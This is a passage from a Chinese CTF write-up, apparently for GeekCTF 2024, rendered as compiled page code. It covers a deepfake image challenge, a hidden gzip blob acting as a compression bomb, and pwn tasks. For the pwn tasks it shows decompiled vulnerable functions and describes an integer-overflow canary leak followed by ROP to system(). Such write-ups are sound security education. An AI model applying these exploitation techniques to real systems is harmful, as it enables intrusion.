c31\u7528wumb0\u7684\u4ee3\u7801\u628a\u8fd9\u91cc\u7684r\u8865\u4e01\u6253\u4e0a\uff0c\u7136\u540e\u518d\u6253\u4e0a\u9898\u76ee\u7ed9\u7684f\u8865\u4e01\u3002\u628a\u6253\u597d\u8865\u4e01\u7684\u7a0b\u5e8f\u653e\u8fdbghidra\u9006\u5411\uff0c\u5728\u5b57\u7b26\u4e32\u533a\u57df\u6211\u4eec\u9996\u5148\u5c31\u53d1\u73b0\u539f\u672c\u662fcurl\u7248\u672c\u7684\u90e8\u5206\u53d8\u6210\u4e86flag\u3002\u9759\u6001\u5206\u6790\u53ef\u80fd\u4e5f\u884c\uff0c\u4e0d\u8fc7\u6211\u76f4\u63a5",(0,s.jsx)(n.code,{children:".\\curl.exe --version"}),"\u51faflag\u4e86\u3002"]}),"\n",(0,s.jsx)(n.h2,{id:"misc---real-or-not-1",children:"misc - real or not 1"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u9996\u5148\u4f1a\u8fc7\u4e00\u4e2aPoW\uff0c\u7206\u7834hash\u3002\u7136\u540e\u4f1a\u4e00\u6b21\u6027\u7ed9\u51fa20\u5f20\u56fe\u7247\u7684base64\uff0c\u8ba9\u6211\u4eec\u5224\u65ad\u8fd9\u4e9b\u56fe\u7247\u7684\u6587\u4ef6\u540d\u672b\u5c3e\u662f",(0,s.jsx)(n.code,{children:"Y"}),"\u8fd8\u662f",(0,s.jsx)(n.code,{children:"N"}),"\uff0c\u9700\u8981\u4e00\u6b21\u6027\u7ed9\u51fa\u6240\u6709\u7b54\u6848\u3002\u56e0\u4e3a\u6587\u4ef6\u540d\u4fe1\u606f\u5b8c\u5168\u4e22\u5931\uff0c\u8fd9\u4e2a\u9898\u76f8\u5f53\u65e0\u5398\u5934\u3002\u597d\u5728\u7b2c\u4e00\u95ee\u662f\u4f1a\u544a\u8bc9\u4f60\u662f\u5728\u7b2cn\u8f6e\u51fa\u9519\u7684\uff0c\u90a3\u4e48\u524dn-1\u8f6e\u90fd\u662f\u5bf9\u7684\uff0c\u7b2cn\u8f6e\u662f\u9519\u7684\u3002\u6211\u4eec\u53ea\u8981\u5f04\u4e2a\u5b57\u5178+pickle\u8bb0\u5f55\u6bcf\u6b21\u7684\u7ed3\u679c\uff08\u53ef\u4ee5\u628a\u56fe\u7247\u7684hash\u4f5c\u4e3akey\uff09\uff0c\u591a\u8bd5\u51e0\u6b21\uff0c\u603b\u80fd\u7206\u51fa\u6765\u7684\u3002\u53e6\u5916\u6211\u53d1\u73b0\u73af\u5883\u5173\u4e86\u518d\u5f00YN\u7ed3\u679c\u53ef\u80fd\u4f1a\u4e0d\u4e00\u81f4\uff0c\u6700\u597d\u4e00\u6b21\u6027\u505a\u5b8c\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"flag{DeepFake_1s_Ea5y_aNd_1ntere5t1ng!}"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5176\u4ed6\u601d\u8def\uff0c\u9996\u5148\u662f\u56fe\u7247\u672c\u8eab\u53ef\u80fd\u6709\u95ee\u9898\uff08\u6211\u62ff\u5230flag1\u540e\u66f4\u89c9\u5f97\u8fd9\u4e2a\u53ef\u80fd\uff0c\u4f46\u662fpngcheck\u548cfile\u90fd\u770b\u4e0d\u51fa\u95ee\u9898\uff09\u3002\u5176\u6b21\uff0cPoW\u751f\u6210\u4f7f\u7528\u7684",(0,s.jsx)(n.code,{children:"random.choices(string.ascii_letters + string.digits, k=16)"}),"\uff0c\u8bf4\u4e0d\u5b9a\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u7206\u51fa\u79cd\u5b50\uff08\u5b9e\u9645\u4e0a\u6bcf\u4e2achoice\u90fd\u662f\u4e00\u6b21",(0,s.jsx)(n.code,{children:"random()"}),"\uff0c\u800c\u4e00\u6b21",(0,s.jsx)(n.code,{children:"random()"}),"\u5bf9\u5e94\u4e24\u6b21",(0,s.jsx)(n.code,{children:"randint32"}),"\uff0c\u4e0d\u8fc7\u56e0\u4e3a\u7ed3\u679c\u662f\u6d6e\u70b9\u6570\uff0c\u663e\u7136\u5f97\u4e0d\u5230\u5185\u90e8\u72b6\u6001\u3002\u800c\u4e14\u5c31\u7b97\u80fd\u9884\u6d4b\u968f\u673a\u6570\uff0c\u6211\u4eec\u4e5f\u4e0d\u77e5\u9053\u540e\u9762filename\u90a3\u91cc\u7684choice\u600e\u4e48\u5bf9\u5e94\uff09"]}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e2a\u9898\u540e\u9762\u7ed9\u4e86\u4e2a\u8865\u4e01\uff0c\u7b2c\u4e8c\u95ee\u4fee\u8fc7\u4e4b\u540e\uff0cPoW\u65f6\u95f4\u5ef6\u957f\uff0c\u4e5f\u4e0d\u80fd\u6839\u636e\u8f6e\u6b21\u6cc4\u9732\u6b63\u786e\u7b54\u6848\u4e86\uff0c\u4e0d\u4f1a\u505a\u3002\u4f46\u505a\u51fa\u6765\u4eba\u5f88\u591a\uff0c\u770b\u6765\u6709\u6211\u4e0d\u77e5\u9053\u7684\u4e1c\u897f\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"misc---whereismyflag",children:"misc - whereismyflag"}),"\n",(0,s.jsxs)(n.p,{children:["\u4ec5\u6b21\u4e8e\u7b7e\u5230\u7684\u7b80\u5355\u9898\uff0c\u4f46\u5176\u5b9e\u8fd9\u9898\u57fa\u672c\u662f",(0,s.jsx)(n.a,{href:"https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob21-gzip",children:"GeekGame3\u672a\u6765\u78c1\u76d8"}),"\u7684\u5f31\u5316\u7248\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2agithub\u4ed3\u5e93\u3002clone\u4e0b\u6765\u540e\uff0c\u53d1\u73b0\u6ca1\u6709\u5386\u53f2\u8bb0\u5f55\uff0c\u4f46",(0,s.jsx)(n.code,{children:"schedule-ics-exporter.py"}),"\u7684\u6700\u540e\u4e00\u884c\u597d\u50cf\u7279\u522b\u957f\u554a\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"print('[+] Done! ICS file successfully generated.')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import gzip; import base64; gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))\n# remove spaces:\nimport gzip; import base64; gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u770b\u8d77\u6765\u7528gzip\u89e3\u538b\u4e86\u4e00\u4e2a\u4e1c\u897f\u3002\u6211\u4eec\u4fdd\u5b58\u4e3a",(0,s.jsx)(n.code,{children:".tar.gz"}),"\u624b\u52a8\u89e3\u538b\uff0c\u53d1\u73b0\u91cc\u9762\u8fd8\u6709\u4e2a",(0,s.jsx)(n.code,{children:"tar.gz"}),"\u3002\u4f46\u518d\u89e3\u538b\u4e4b\u524d\u5f97\u5c0f\u5fc3\u4e86\uff0c\u56e0\u4e3a\u7b2c\u4e8c\u8f6e\u7684",(0,s.jsx)(n.code,{children:"tar.gz"}),"\u67092M\u7684\u5927\u5c0f\uff0c\u800c\u5b83\u89e3\u538b\u540e\u7684\u5185\u5bb9\u66f4\u662f\u67091GB\u3002\u770b\u6765\u8fd9\u662f\u4e2a\u538b\u7f29\u70b8\u5f39\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5982\u6b64\u79bb\u8c31\u7684\u89e3\u538b\u7387\uff0c\u90a3\u80af\u5b9a\u662f\u56e0\u4e3a\u539f\u59cb\u6587\u4ef6\u4e2d\u5168\u662f\u91cd\u590d\u4e32\uff0c\u8fd9\u6837\u7684\u6587\u4ef6\u5728zlib\u538b\u7f29\u4e0b\u4f1a\u4ea7\u751f\u5faa\u73af\u8282\u3002\u7ecf\u8fc7\u4e00\u4e9b\u6d4b\u8bd5\uff08\u4e3b\u8981\u8fd8\u662f010editor\u641c\u7d22\u529f\u80fd\uff09\uff0c\u4f1a\u53d1\u73b0\u5faa\u73af\u8282\u662f",(0,s.jsx)(n.code,{children:"0x8031"}),"\u3002\u6211\u4eec\u53ef\u4ee5\u6253\u5370\u6bcf\u4e2a\u5faa\u73af\u8282\u7684hash"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"cyclic = 0xc054 - 0x4023\n\nfor i in range(0x4030, len(secret_gz), cyclic):\n    seg = secret_gz[i:i+cyclic]\n    seg_hash = md5(seg).hexdigest()\n    print(hex(i), seg_hash)\n\n# output\n0x4030 b5f977612e6028cc915d4696d27f1e4c\n0xc061 b5f977612e6028cc915d4696d27f1e4c\n0x14092 b5f977612e6028cc915d4696d27f1e4c\n0x1c0c3 b5f977612e6028cc915d4696d27f1e4c\n0x240f4 b5f977612e6028cc915d4696d27f1e4c\n0x2c125 b5f977612e6028cc915d4696d27f1e4c\n0x34156 b5f977612e6028cc915d4696d27f1e4c\n0x3c187 b5f977612e6028cc915d4696d27f1e4c\n0x441b8 b5f977612e6028cc915d4696d27f1e4c\n0x4c1e9 b5f977612e6028cc915d4696d27f1e4c\n0x5421a b5f977612e6028cc915d4696d27f1e4c\n0x5c24b b5f977612e6028cc915d4696d27f1e4c\n0x6427c b5f977612e6028cc915d4696d27f1e4c\n0x6c2ad b5f977612e6028cc915d4696d27f1e4c\n0x742de b5f977612e6028cc915d4696d27f1e4c\n0x7c30f b5f977612e6028cc915d4696d27f1e4c\n0x84340 b5f977612e6028cc915d4696d27f1e4c\n0x8c371 b5f977612e6028cc915d4696d27f1e4c\n0x943a2 b5f977612e6028cc915d4696d27f1e4c\n0x9c3d3 b5f977612e6028cc915d4696d27f1e4c\n0xa4404 b5f977612e6028cc915d4696d27f1e4c\n0xac435 b5f977612e6028cc915d4696d27f1e4c\n0xb4466 b5f977612e6028cc915d4696d27f1e4c\n0xbc497 b5f977612e6028cc915d4696d27f1e4c\n0xc44c8 b5f977612e6028cc915d4696d27f1e4c\n0xcc4f9 b5f977612e6028cc915d4696d27f1e4c\n0xd452a b5f977612e6028cc915d4696d27f1e4c\n0xdc55b b5f977612e6028cc915d4696d27f1e4c\n0xe458c b5f977612e6028cc915d4696d27f1e4c\n0xec5bd b5f977612e6028cc915d4696d27f1e4c\n0xf45ee d654be24ae26570873990c441b74b80f\n0xfc61f 57307bdd454f14e64a7d0c3e0d346070\n0x104650 57307bdd454f14e64a7d0c3e0d346070\n0x10c681 57307bdd454f14e64a7d0c3e0d346070\n0x1146b2 57307bdd454f14e64a7d0c3e0d346070\n0x11c6e3 57307bdd454f14e64a7d0c3e0d346070\n0x124714 57307bdd454f14e64a7d0c3e0d346070\n0x12c745 57307bdd454f14e64a7d0c3e0d346070\n0x134776 57307bdd454f14e64a7d0c3e0d346070\n0x13c7a7 57307bdd454f14e64a7d0c3e0d346070\n0x1447d8 57307bdd454f14e64a7d0c3e0d346070\n0x14c809 57307bdd454f14e64a7d0c3e0d346070\n0x15483a 57307bdd454f14e64a7d0c3e0d346070\n0x15c86b 57307bdd454f14e64a7d0c3e0d346070\n0x16489c 57307bdd454f14e64a7d0c3e0d346070\n0x16c8cd 57307bdd454f14e64a7d0c3e0d346070\n0x1748fe 57307bdd454f14e64a7d0c3e0d346070\n0x17c92f 57307bdd454f14e64a7d0c3e0d346070\n0x184960 57307bdd454f14e64a7d0c3e0d346070\n0x18c991 57307bdd454f14e64a7d0c3e0d346070\n0x1949c2 57307bdd454f14e64a7d0c3e0d346070\n0x19c9f3 57307bdd454f14e64a7d0c3e0d346070\n0x1a4a24 57307bdd454f14e64a7d0c3e0d346070\n0x1aca55 57307bdd454f14e64a7d0c3e0d346070\n0x1b4a86 57307bdd454f14e64a7d0c3e0d346070\n0x1bcab7 57307bdd454f14e64a7d0c3e0d346070\n0x1c4ae8 57307bdd454f14e64a7d0c3e0d346070\n0x1ccb19 57307bdd454f14e64a7d0c3e0d346070\n0x1d4b4a 57307bdd454f14e64a7d0c3e0d346070\n0x1dcb7b 57307bdd454f14e64a7d0c3e0d346070\n0x1e4bac 57307bdd454f14e64a7d0c3e0d346070\n0x1ecbdd d30ed2b6a8ede0657a6b374d99f49ce0\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\u4e2d\u95f4\u6709\u8df3\u53d8\uff0c\u524d\u540e\u90fd\u662f\u4e00\u6837\u7684\u4e32\u3002\u8fd9\u4e9b\u4e32\u53ea\u8981\u4fdd\u7559\u4e00\u5904\u5c31\u53ef\u4ee5\u4e86\uff0c\u5176\u4ed6\u90fd\u53ef\u4ee5\u5220\u53bb\u3002\u53bb\u9664\u91cd\u590d\u4e32\u540e\uff0c\u518d\u89e3\u538b\u6587\u4ef6\u5c31\u6ca1\u90a3\u4e48\u5927\u4e86\uff08\u4e5f\u670960M\uff09\u3002\u6ce8\u610f\u56e0\u4e3agzip\u683c\u5f0f\u6700\u540e8\u4e2a\u5b57\u8282\u662fCRC32\u6821\u9a8c\u7801\u548c\u957f\u5ea6\uff0c\u4fdd\u5b58\u5230\u6587\u4ef6\u89e3\u538b\u4f1a\u62a5\u9519\uff0c\u4f46\u53ef\u4ee5\u7528zlib\u89e3\u538b\uff08\u5176\u5b9e\u4e5f\u662f\u770bpython gzip\u5e93\u7684\u6e90\u7801\uff0chook\u6389CRC\u548c\u957f\u5ea6\u7684\u6821\u9a8c\uff09\u89e3\u538b\u51fa\u6765\u662f\u5168NULL\u5b57\u8282+flag\u7684\u5f62\u5f0f\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"pwn---memo\u7cfb\u521723",children:"pwn - memo\u7cfb\u5217\uff082/3\uff09"}),"\n",(0,s.jsx)(n.p,{children:"memo\u7cfb\u5217\uff0c\u524d\u4e24\u95ee\u662f\u6bd4\u8f83\u7b80\u5355\uff0c\u7b2c\u4e09\u95ee\u5f88\u96be\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u7b2c\u4e00\u95ee\u8981\u9006\u5411\u4e00\u4e2a\u5bc6\u7801\u3002\u8fd9\u4e2a\u5bc6\u7801\u4f1amodified base64\u7f16\u7801\u540e\u548c\u5168\u5c40\u5b57\u7b26\u4e32\u53d8\u91cf\u6bd4\u8f83\uff0c\u4f46\u662f\u6ce8\u610f\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u5728",(0,s.jsx)(n.code,{children:"DT_INIT_1"}),"\u91cc\u8fd8\u5bf9\u5b57\u7b26\u4e32\u53d8\u91cf\u5bc6\u7801\u505a\u4e86ascii + 1\u7684\u64cd\u4f5c\u3002\u8fd9\u4e2a\u53ef\u4ee5\u7528gdb\u65ad\u70b9\u62ff\u5230b64\u7f16\u7801\uff0c\u4e5f\u53ef\u4ee5\u5199\u7a0b\u5e8f\uff0c\u600e\u4e48\u6837\u90fd\u597d\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u7b2c\u4e8c\u95ee\u662f\u5728\u7b2c\u4e00\u95ee\u57fa\u7840\u4e0a\uff0c\u8fdb\u5165\u540e\u7eed\u7684\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\u3002\u8fd9\u4e2a\u9898\u4fdd\u62a4\u5168\u5f00\uff0c\u662f\u4e00\u4e2a\u57fa\u4e8e\u6808\u7684\u7ba1\u7406\u7cfb\u7edf\uff0c\u53ef\u4ee5\u589e\u52a0\u3001\u4fee\u6539\u3001\u5c55\u793a\u3001\u5f52\u96f6\u6808\u4e0a\u7684\u4e00\u6761\u8bb0\u5f55\u3002\u5176\u4e2d",(0,s.jsx)(n.code,{children:"edit"}),"\u51fd\u6570\u4f1a\u7528",(0,s.jsx)(n.code,{children:"scanf"}),"\u8bfb\u53d6\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"%lld"}),"\u4f5c\u4e3a\u8bfb\u53d6\u957f\u5ea6\uff0c\u4f46\u540e\u7eed",(0,s.jsx)(n.code,{children:"readline"}),"\u51fd\u6570\u957f\u5ea6\u662f",(0,s.jsx)(n.code,{children:"uint"}),"\uff0c\u6240\u4ee5\u6709\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f20\u8d1f\u6570\u53ef\u4ee5\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u53e6\u5916\uff0c\u8fd9\u4e2a\u9898readline\u53ea\u6709\u5f53\u8bfb\u5165\u5b57\u7b26\u6570\u521a\u597d\u7b49\u4e8e\u4f20\u5165\u957f\u5ea6\u65f6\uff0c\u4e0d\u4f1a00\u622a\u65ad\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'void FUN_001017f2_edit(char *param_1,uint param_2)\n\n{\n  long in_FS_OFFSET;\n  long local_18;\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  printf("How many characters do you want to change:");\n                    /* negative number overflow */\n  __isoc99_scanf("%lld",&local_18);\n                    /* local_18 < (0-0x100) ==0x118?? */\n  if (local_18 < (long)(ulong)param_2) {\n    FUN_0010170e_readline(param_1,(int)local_18);\n    puts("Done!");\n  }\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return;\n}\n\n\nuint FUN_0010170e_readline(char *param_1,uint param_2)\n\n{\n  uint local_c;\n  \n  local_c = 0;\n  while( true ) {\n    if (param_2 <= local_c) {\n      return local_c;\n    }\n    read(0,param_1 + (int)local_c,1);\n    if (param_1[(int)local_c] == \'\\n\') break;\n    local_c = local_c + 1;\n  }\n  param_1[(int)local_c] = \'\\0\';\n  return local_c;\n}\n\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u6709\u4e2a\u5f88\u795e\u5947\u7684\u89e3\u6cd5\uff0c\u5c31\u662f\u5982\u679c\u8fd9\u91cc\u957f\u5ea6\u4f20",(0,s.jsx)(n.code,{children:"0xf000000000000109 - 0x10000 ** 4"}),"\uff0c\u53ef\u4ee5\u65e2\u8ba9",(0,s.jsx)(n.code,{children:"edit"}),"\u91cc\u7684",(0,s.jsx)(n.code,{children:"local_18"}),"\u662f\u4e2a\u8d1f\u6570\u7ed5\u8fc7\u68c0\u67e5\uff0c\u53c8\u53ef\u4ee5\u8ba9",(0,s.jsx)(n.code,{children:"readline"}),"\u91cc\u7684",(0,s.jsx)(n.code,{children:"param_2"}),"\u662f\u4e2a\u6b63\u6570\u4ee5\u4fdd\u8bc1\u622a\u65ad\u3002\u8fd9\u6837\u5c31\u6cc4\u9732\u51facanary\u4e86\u3002\u540e\u9762\u5c31\u7b80\u5355ROP\u8c03\u7528\u4e00\u4e0bsystem\u5c31\u884c\u4e86\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u7b2c\u4e09\u95ee",(0,s.jsx)(n.code,{children:"edit"}),"\u8fd9\u91cc\u5c31\u6539\u6210",(0,s.jsx)(n.code,{children:"%u"}),"\u4e86\uff0c\u540c\u65f6\u6574\u4e2a\u7b14\u8bb0\u4e0d\u5728\u6808\u4e0a\uff0c\u800c\u662f\u533f\u540dmmap\u5230\u5806\u4e0a\uff08ld\u4e0a\u65b9\uff0clibc\u4e0b\u65b9\uff09\u3002\u540c\u65f6\u589e\u52a0\u4e86\u4e00\u4e2asign\u51fd\u6570\uff0c\u53ef\u4ee5\u505a\u5230\uff1a\u8bfb\u53d6\u76f8\u5bf9\u4e8e",(0,s.jsx)(n.code,{children:"mmap"}),"\u57fa\u5730\u5740\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"uint"}),"\u5b57\u8282\u7684\u4f4d\u7f6e\uff08\u53ea\u80fd\u5411\u9ad8\u5730\u5740\u6ea2\u51fa\u4e86\uff098\u5b57\u8282\uff0c\u8fdb\u884c\u4e00\u6b21",(0,s.jsx)(n.code,{children:"0x50"}),"\u5b57\u8282\u7684\u6808\u6ea2\u51fa\uff08canary\u57280x18, \u8fd4\u56de\u5730\u5740\u57280x28\uff09\uff0c\u518d\u4fee\u6539\u521a\u521a\u8bfb\u53d6\u5730\u65b9\u76840x10\u5b57\u8282\u3002\u7136\u540e\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u8c03\u7528",(0,s.jsx)(n.code,{children:"_exit"}),"\u9000\u51fa\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'\nvoid FUN_00101a19_sign(int param_1)\n\n{\n  long in_FS_OFFSET;\n  uint local_2c;\n  char local_28 [24];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  printf("Where would you like to sign(after the content): ");\n  __isoc99_scanf("%u",&local_2c);\n  if (DAT_00104130_mmap[local_2c] != \'\\0\') {\n    printf("You will overwrite some content: ");\n                    /* this can leak addr, libc and mmap should be adjacent? */\n    write(1,DAT_00104130_mmap + local_2c,8);\n  }\n  printf("Enter your name: ");\n                    /* stackoverflow here, can trigger __stack_chk_fail */\n  FUN_001017e9_readline(local_28,0x50);\n  strncpy(DAT_00104130_mmap + local_2c,local_28,0x10);\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return;\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u6211\u611f\u89c9\u5e94\u8be5\u662f\u548c",(0,s.jsx)(n.code,{children:"ld.so"}),"\u6709\u5173\uff0c\u53ef\u80fd\u5806\u4e0a\u6709canary\u76f8\u5173\u4fe1\u606f\u3002\u53ef\u60dcfsbase\u5728\u6620\u5c04\u5730\u5740\u7684\u4f4e\u5730\u5740\u5904\uff0c\u6240\u4ee5\u5e94\u8be5\u65e0\u6cd5\u4ece\u8fd9\u91cc\u8bfb\u53d6canary\u3002\u65e0\u8bba\u662f",(0,s.jsx)(n.code,{children:"__stack_chk_fail"}),"\u8fd8\u662f",(0,s.jsx)(n.code,{children:"_exit"}),"\u6211\u4eec\u4f3c\u4e4e\u90fd\u6ca1\u6cd5\u5e72\u6d89\u3002\u8fd8\u6709\u53ef\u80fd\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u9898\u7ed9\u4e86\u5f88\u5b8c\u6574\u7684\u73af\u5883\uff0c\u4e0d\u77e5\u9053",(0,s.jsx)(n.code,{children:"xinetd"}),"\u4ea7\u751f\u8fdb\u7a0b\u662f",(0,s.jsx)(n.code,{children:"fork"}),"\u8fd8\u662f",(0,s.jsx)(n.code,{children:"spawn"}),"\uff0c\u4e0d\u77e5\u9053canary\u662f\u5426\u5171\u4eab\uff1f"]}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["2024.5.29\u66f4\u65b0\uff1a\u770b",(0,s.jsx)(n.a,{href:"https://deepunk.icu/GeekCTF2024wp/",children:"https://deepunk.icu/GeekCTF2024wp/"}),"\uff0c\u5199\u5f97\u597d\u4e5f\u5f88\u6709\u6897"]}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"pwn-flat",children:"pwn-flat"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u524d\u534a\u90e8\u5206\u662f\u53bb\u6df7\u6dc6\uff0c\u9898\u76ee\u5f88\u660e\u663e\u662f",(0,s.jsx)(n.code,{children:"ollvm"}),"\u90a3\u79cd\u5355\u4e2a\u63a7\u5236\u53d8\u91cf\u7684\u6df7\u6dc6\u65b9\u6cd5\uff0c\u975e\u5e38\u6807\u51c6\uff0c\u5728diagram\u91cc\u770b\u7684\u5f88\u6e05\u695a\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:c(6674).A+"",width:"1004",height:"1022"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u8fd9\u91cc\u4e5f\u662f\u7528\u4e86\u522b\u4eba\u5199\u7684\u53bb\u6df7\u6dc6\u63d2\u4ef6",(0,s.jsx)(n.a,{href:"https://github.com/PAGalaxyLab/ghidra_scripts/blob/master/ollvm_deobf_fla.py",children:"ollvm_deobf_fla"})]}),"\n",(0,s.jsxs)(n.p,{children:["\u53bb\u6df7\u6dc6\u4e4b\u540e\uff0c\u5c31\u662f\u7ecf\u5178\u7684\u5806\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\uff0c\u53ea\u4e0d\u8fc7\u6ca1\u6709\u56de\u663e\u3002\u8fd9\u4e2a\u9898\u4e5f\u662f\u589e\u5220\u6539\u67e5\u90fd\u6709\uff0c\u4e0d\u8fc7\u8fd9\u4e9b\u90e8\u5206\u90fd\u6ca1\u6709\u6f0f\u6d1e\uff08free\u540e\u6307\u9488\u7f6e\u7a7a\uff0c\u5927\u5c0f\u548cindex\u4e24\u4fa7\u5224\u65ad\u6ca1\u6709\u6574\u6570\u6ea2\u51fa\uff0c\u8bfb\u53d6\u5b57\u7b26\u4e32\u81f3\u591a\u8bfb\u53d6n-1\u4e2a\u5e76\u4e14\u6700\u540e\u4e00\u5b9a\u4f1a\u52a0\u4e0a\u7a7a\u5b57\u8282\uff09\uff0c\u800c\u662f\u7ed9\u4e86\u4e00\u4e2a\u53ea\u80fd\u7528\u4e00\u6b21\u7684",(0,s.jsx)(n.code,{children:"bad"}),"\u90e8\u5206\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"if (!bVar1) {\n                /* WARNING: Subroutine does not return */\n    exit(0);\n}\nbVar1 = false;\niVar2 = FUN_004016b0_readint?();\nif (((iVar2 < 0) || (0x1f < iVar2)) ||\n    ((note_ARRAY_004060b0[iVar2].mem == (char *)0x0 || (note_ARRAY_004060b0[iVar2].length == 0)))\n    ) break;\nfor (local_16c = 0; local_16c < (uint)note_ARRAY_004060b0[iVar2].length;\n    local_16c = local_16c + 1) {\n                /* convert to char, so >0x7f would overflow to negative */\n    read(0,note_ARRAY_004060b0[iVar2].mem + 